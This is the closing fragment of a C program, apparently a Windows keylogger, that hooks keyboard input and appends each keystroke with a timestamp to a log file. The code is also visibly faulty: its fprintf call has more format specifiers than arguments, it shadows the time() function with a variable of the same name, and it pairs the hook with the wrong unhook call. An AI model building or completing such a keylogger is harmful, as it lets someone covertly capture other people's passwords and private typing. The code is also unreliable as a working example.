                            break;
                    }
                }

                // Write to file
                time_t time;
                time(&time);
                fprintf(fp, "[%s] %c %c %d\n", ctime(&time), key, (shift ? 1 : 0));
            }
        } else {
            // Key is released
            // Optionally log release events if needed
        }

        Sleep(1); // Reduce CPU usage
    }

    // Release the hook and close the file
    UnhookWindowsHook(hook);
    fclose(fp);
    return 0;
}
```

